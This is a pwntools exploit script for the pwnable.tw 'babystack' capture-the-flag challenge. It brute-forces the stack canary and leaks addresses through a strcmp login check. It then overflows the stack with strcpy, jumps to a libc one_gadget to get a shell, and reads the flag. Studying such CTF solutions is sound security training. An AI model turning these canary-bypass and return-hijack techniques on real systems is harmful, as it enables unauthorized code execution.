from pwn import *

# Set up pwntools for the correct architecture
exe = "./babystack"
libc = ELF("libc_64.so.6")
context.binary = elf = ELF(exe)
# context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10205)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def login(passwd):
    sla(b">> ", b"1")
    sla(b"Your passowrd :", passwd)
    result = rl()
    return result

def logout():
    sla(b">> ", b"1"*15)

def brute(canary, num):
    for i in range(num):
        for j in range(1, 256):
            if b"Login Success !\n" in login(canary + p8(j)):
                canary += p8(j)
                logout()
                print(b"1")
                break
    return canary

def copy(stuff):
    sla(b">> ", b"3")
    sla(b"Copy :", stuff)

r = start()

something = brute(b"", 38)
can = something[:16]
elf.address = u64(something[-6:].ljust(8, b"\x00")) - 4192

log.info(f"elf      : {hex(elf.address)}")
log.info(f"canary   : {can}")

sla(b">> ", b"1")
sa(b"Your passowrd :", b"\x00" + b"B"*(0x58-1))
copy(b"B"*63)

# logout()
sa(b">> ", b"1")

def brute2(canary, num):
    for i in range(num):
        for j in range(1, 256):
            if b"Login Success !\n" in login(canary + p8(j)):
                canary += p8(j)
                sa(b">> ", b"1")
                break
    return canary

libc.address = u64((brute2(b"B"*16 + b"1\nBBBBBB", 8)[-6:]).ljust(8, b"\x00")) - 458676
log.info(f"libc     : {hex(libc.address)}")

one_gadget = libc.address + 0xf0567

sla(b">> ", b"1")
sa(b"Your passowrd :", b"\x00" + b"B"*(63) + can + b"B"*24 + p64(one_gadget))
copy(b"B"*63)

sla(b">>", b"2")
sl(b"cat '/home/baby_stack/flag'")

r.interactive()

'''
vuln: 
* strcmp to cmp more and get leaks
* strcpy with a stack reuse to get overflow.
'''
